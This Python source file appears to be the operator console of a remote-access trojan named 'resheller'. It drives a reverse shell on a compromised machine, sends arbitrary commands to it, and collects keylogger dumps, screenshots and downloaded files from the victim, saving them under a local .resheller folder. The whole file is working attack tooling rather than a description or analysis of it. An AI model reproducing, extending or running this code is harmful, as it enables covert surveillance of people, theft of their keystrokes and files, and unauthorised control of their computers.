#!/usr/bin/env python3
from base64 import b64decode
from os import path
from pathlib import Path
from time import strftime

from src.pipe.safe_socket import SafeSocket
from src.stdout.color import Color
from src.stdout.output import usage


class Shell:

    def __init__(self, ips, targets, sessions):
        self.ips = ips
        self.targets = targets
        self.target = targets[sessions]
        self.ip, _ = ips[sessions]
        self.time = strftime("%H.%M.%S")
        self.safe_sock = SafeSocket(self.target)
        self.windows = self.safe_sock.callback("get_os")
        self.usr = self.get_username()
        self.host = self.safe_sock.callback("hostname")[:-2]

    def get_username(self):
        usr = self.safe_sock.callback("whoami")
        if self.windows:
            return usr.split("\\")[1][:-2]
        return usr

    @staticmethod
    def make_dir(command):
        home = str(Path.home())
        date = strftime("%Y.%m.%d")
        main_dir = path.join(home, ".resheller")
        _dir = path.join(main_dir, date, command)
        if not path.isdir(_dir):
            Path(_dir).mkdir(parents=True, exist_ok=True)
        return _dir

    def keylogger_dump(self):
        _dir = self.make_dir("logs")
        log_file = path.join(_dir, f"keylog_{self.time}.txt")
        logs = self.safe_sock.recv()
        if logs[:3] == "[!]":
            print(Color(logs).b_red())
        else:
            with open(log_file, 'w') as log:
                log.write(logs)
            print(logs)
            print(Color(f"Saved {log_file}\n").grn())

    def download(self, command):
        # TODO - fix loop
        count = 1
        _dir = self.make_dir("downloads")
        downloaded = path.join(_dir, f"{command[9:]}")
        while True:
            if path.isfile(downloaded):
                count += 1
                downloaded = f"{downloaded}_{count}"
            else:
                break
        with open(downloaded, 'wb') as file:
            payload = self.safe_sock.recv()
            file.write(b64decode(payload))
        print(Color(f'Saved {downloaded}\n').grn())

    def screenshot(self):
        _dir = self.make_dir("screenshots")
        screenshot = path.join(_dir, f"screenshot_{self.time}.png")
        payload = self.safe_sock.recv()
        image = b64decode(payload)
        if image[:3] == "[!]":
            print(Color(image).b_red())
        else:
            with open(screenshot, "wb") as shot:
                shot.write(image)
                shot.close()
            print(Color(f"Saved {screenshot}\n").grn())

    def print_stdout(self):
        stdout = self.safe_sock.recv()
        if stdout[:3] == "[+]":
            if len(stdout) > 3:
                stdout = Color(f"{stdout}\n").b_grn()
            else:
                return
        elif stdout[:3] == "[!]":
            stdout = Color(f"{stdout}\n").b_red()
        elif stdout[:3] == "[*]":
            stdout = Color(f"{stdout}\n").ylw()
        print(stdout)
        return

    def independent_path(self, *args):
        if self.windows:
            return path.join(*args).replace("/", "\\")
        else:
            return path.join(*args)

    def resolve_path(self, root, del_, dirs):
        path_ = "~"
        if len(dirs) == 1:
            return dirs[0]
        if len(dirs) == 2:
            if root:
                return path_ + dirs[0]
            return dirs[0] + dirs[1]
        if len(dirs) == 3:
            if root:
                return self.independent_path(path_, dirs[2])
            return f"{path_}{dirs[0]}"
        if len(dirs) > 3:
            base = dirs.pop(-1)
            del dirs[0:del_]
            for _ in dirs:
                path_ = self.independent_path(path_, "..")
            return self.independent_path(path_, base)

    def get_path(self):
        if self.windows:
            req, sep, chop = "cd", "\\", 2
        else:
            req, sep, chop = "pwd", "/", 1
        stdout = self.safe_sock.callback(req)
        dirs = stdout.split(sep)
        dirs[-1] = dirs[-1][:-chop]
        dirs[0] = sep
        if dirs[1] == "root":
            root, del_ = True, 2
        else:
            root, del_ = False, 3
        return self.resolve_path(root, del_, dirs)

    def ps1(self):
        return input(f'{Color("{").b_blu()}{Color(self.usr).b_red()}'
                     f'{Color("@").b_blu()}{Color(self.host).b_red()}:'
                     f'{Color(self.get_path()).b_grn()}{Color("}>").b_blu()} ')

    def exit_shell(self):
        self.target.close()
        self.targets.remove(self.target)
        self.ips.remove(self.ip)

    def shell(self):
        print(Color("[+] Connection Established\n").b_grn())
        while True:
            command = self.ps1()
            if command == "help":
                print(Color(usage()).ylw())
                continue
            if command == "ls":
                command = "dir"
            self.safe_sock.send(command)
            if command == 'quit':
                break
            elif command == "exit":
                self.exit_shell()
                break
            elif command[:14] == "keylogger dump":
                self.keylogger_dump()
            elif command[:8] == "download":
                self.download(command)
            elif command[:10] == "screenshot":
                self.screenshot()
            else:
                self.print_stdout()
